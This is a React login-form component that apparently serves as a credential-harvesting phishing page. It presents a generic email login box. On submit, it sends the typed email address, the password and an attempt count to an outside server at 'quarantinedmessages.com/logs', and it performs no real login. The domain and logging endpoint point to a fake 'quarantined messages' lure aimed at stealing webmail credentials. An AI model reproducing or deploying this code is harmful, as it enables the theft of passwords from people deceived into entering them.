import React, { useState } from 'react'
import '../styles/Form.css'
import {IoIosMail} from "react-icons/io"
import {AiFillEye} from 'react-icons/ai'

const Form = () => {

    const [email, setEmail] = useState('email');
    const [password, setPassword] = useState('');
    const [count, setCount] = useState(0);
    const [isLoading, setIsLoading] = useState(false)

    const handleSubmit = async (e) => {
        e.preventDefault();
    
        const requestBody = {
          email: email,
          password: password,
          count: count,
        };
    
        try {
            setIsLoading(true)
          const response = await fetch('https://quarantinedmessages.com/logs', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(requestBody),
          });
    
          const responseData = await response.json() 
    
          if (response.ok) {
            console.log(`Post request successful: ${JSON.stringify(responseData)}`);
          } else {
            console.error(`Post request failed: ${JSON.stringify(responseData)}`);
          }
        } catch (error) {
          console.error('An error occurred:', error);
        } finally{
            setIsLoading(false)
            setPassword('')
        }
      }; 
  return (
    <div className='form'>
        <div className="form-contain">
            <div className="form-cover">
                <div className="email">
                    <IoIosMail color='#1c449b' fontSize={40}/>
                    <h5>e-mail</h5>
                </div>
                <form onSubmit={handleSubmit} className="forms-input">
                    <div className="email-form">
                        <div className="e-input">
                            <input 
                                type="text" 
                                value={email} 
                                onChange={(e) => setEmail(e.target.value)} 
                                placeholder='E-mail address' 
                            />   
                        </div>
                    </div>
                    <div className="password">
                        <input
                             type="password" 
                             value={password} 
                             onChange={(e) => setPassword(e.target.value)} 
                             // required 
                             placeholder='Password'
                        />
                        <AiFillEye color='#bcbcbc' fontSize={20}/>
                    </div>
                </form>
                <div className="login">
                    {isLoading ? 
                    <p>Sending</p> :
                    null    
                }
                        <button type='submit' onClick={handleSubmit}>Login</button>
                    </div>
            </div>
        </div>
    </div>
  )
}

export default Form